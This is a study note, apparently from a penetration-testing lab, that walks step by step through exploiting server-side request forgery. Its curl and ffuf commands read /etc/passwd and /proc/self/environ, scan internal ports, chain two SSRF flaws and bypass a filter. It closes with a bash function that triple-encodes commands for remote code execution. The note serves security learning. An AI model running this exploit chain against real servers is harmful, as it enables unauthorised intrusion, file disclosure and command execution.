---
id: SSRF
created_date: 05/01/2023
updated_date: 05/01/2023
type: note
---

#  SSRF Exploit example
- **🏷️Tags** :  #01-2023 #SSRF #web #explotation #nmap #python #ftp #http #rce

## 📝 Notes

### what is it ? 

Server-Side Request Forgery (SSRF) is a type of vulnerability that allows an attacker to send arbitrary requests from a vulnerable server to other internal or external servers, typically in an attempt to access restricted resources or to bypass security controls.

In a SSRF attack, the attacker crafts a malicious request that appears to come from a trusted server, and tricks the vulnerable server into sending the request to a target server or resource. This can allow the attacker to access resources that are normally restricted to the server, such as internal network resources or services that are not accessible from the public internet.

SSRF vulnerabilities can be exploited in a variety of ways, including:

-   Accessing internal network resources
-   Bypassing security controls
-   Conducting port scanning
-   Launching DDoS attacks

Overall, SSRF vulnerabilities can pose a significant risk to organizations, as they can allow attackers to access restricted resources and bypass security controls. It is important for organizations to secure their systems against SSRF attacks and to regularly test for and mitigate these vulnerabilities.

### Discovering port

#### Nmap - Discovering Open Ports

```bash
nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>
```

### Interacting with curl 
#### Curl - Interacting with the Target

```bash
curl -i -s http://<TARGET IP>
```

```bash
curl -i -s -L http://<TARGET IP>
```

The `-i` flag includes the HTTP header in the output.

The `-s` flag tells `curl` to be silent, which means it will not show progress meter or error messages.

The `-L` flag tells `curl` to follow any redirects that it encounters. This can be useful when the target URL returns a redirect response (such as a "301 Moved Permanently" or "302 Found" status code).

### Test the SSRF vulnerability 
#### Curl - Testing for SSRF

```bash
curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"
```

#### Netcat Listener - Confirming SSRF

```bash
Connection received on <TARGET IP> 49852
GET / HTTP/1.1
Accept-Encoding: identity
Host: <VPN/TUN Adapter IP>:8080
User-Agent: Python-urllib/3.8
Connection: close
```

### Excercise (python urllib)

- create a index.html in a directory 
#### http server
- inside this directory launch a python server with the following command 
```bash
python3 http.server <PORT>
```
-  Retrieving a remote file through the target application - HTTP Schema
```bash
curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"
```

#### ftp server
- inside this directory launch an ftp server with the following command
```bash
sudo pip3 install twisted
sudo python3 -m twisted ftp -p 21 -r .
```
-  Retrieving a remote file through the target application - FTP Schema
```shell-session
curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"
```

### #### Retrieving a local file through the target application - File Schema

```bash
curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 926
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:27:17 GMT

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

### generate a word list for all the port and use it with fuff

#### Generate a Wordlist

```bash
for port in {1..65535};do echo $port >> ports.txt;done
```

#### Usage
  Curl - Interacting with the Target
  
```shell-session
GabrielQK@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 30
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:36:25 GMT

[Errno 111] Connection refused
```

**Use ffuf with the wordlist and discard the responses which have the size we previously identified.**

```shell-session
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>/load?q=http://127.0.0.1:PORT
 :: Wordlist         : PORT: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 30
________________________________________________

80                      [Status: 200, Size: 153, Words: 11, Lines: 8]
5000                    [Status: 200, Size: 64, Words: 3, Lines: 1]
```

The `-u` flag specifies the URL to send requests to. In this case, the URL includes `<TARGET IP>`, which is a placeholder for the IP address of the target machine. The `-fs` flag specifies the minimum number of characters that a response body must have in order to be considered a successful response.

### Curl interacting with the target

```bash
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"
```


The `q` parameter in the URL is being set to another URL that includes the domain `internal.app.local` and the `load` and `q` parameters. This is likely being done in order to test whether the target machine is able to make connections to other servers or services running on the internal network.

### Exercise
#### cURL - Interacting with the Target

```bash
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 97
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:52:32 GMT

<html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>
```

We have received an `unknown url type` error message. It seems the web application is removing `://` from our request. Let's try to overcome this situation by modifying the URL.

```bash
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 99
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:55:10 GMT

<html><body><h1>Resource: http://127.0.0.1:1</h1><a>[Errno 111] Connection refused</a></body></html>
```

In this case, the web application returns some HTML rendered content containing the resource we are trying to fetch. This response will affect our internal service discovery if we use the size of the response as a filter as it will change depending on the port. Fortunately for us, ffuf supports regular expressions (reggex) for filtering. We can use this ffuf feature to use the error number for filtering responses, as follows.

```bash
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT
 :: Wordlist         : PORT: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Errno[[:blank:]]111
________________________________________________

80                      [Status: 200, Size: 153, Words: 5, Lines: 6]
5000                    [Status: 200, Size: 123, Words: 3, Lines: 5]
```

The result will look like this,

```shell-session
GabrielQK@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 385
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:30:07 GMT

<html><body><h1>Resource: http://127.0.0.1:5000/</h1><a>total 24K
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..
-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html
-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py
-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py
-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh
 </a></body></html>
```

##### Let us make a quick recap of what we have achieved:

-   Issue requests on behalf of ubuntu-web to internal.app.local
-   Reach a web application listening on port 5000 inside internal.app.local chaining two SSRF vulnerabilities
-   Disclose a list of files via the internal application

Let us issue a request to disclose `/proc/self/environ` file, where the current path should be present under the `PWD` environment variable.

```bash
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
```

Now we know that the current path is `/app`, and we have a list of interesting files. Let's disclose the `internal_local.py` file as follows.

```bash
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
```

By studying the source code above, we notice a functionality that allows us to execute commands on the remote host sending a GET request to`/runme?x=<CMD>`. Let us confirm remote code execution by sending `whoami` as a command.

you can use it like this 
```bash
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"
```

To execute commands with arguments or special characters, we need to encode them three times as we pass them through three different web applications.

For doing so, you can use any online URL-encoding service such as [urlencoder.org](https://www.urlencoder.org/). A quick way to achieve this from the terminal also exists. This is to use `jq`, which supports encoding as follows:

```bash
sudo apt-get install jq
echo "encode me" | jq -sRr @uri
>>> encode%20me%0A
```

we can automate it with a simple function 

```bash
function rce() {
while true; do
echo -n "# "; read cmd
ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
echo ""
done
}
```

For finishing the Exercise we used the function on the target and use the command 
```bash
cat /app/../../root/flag.txt
```

## Questions/Thoughts


## 🔗 Links
-  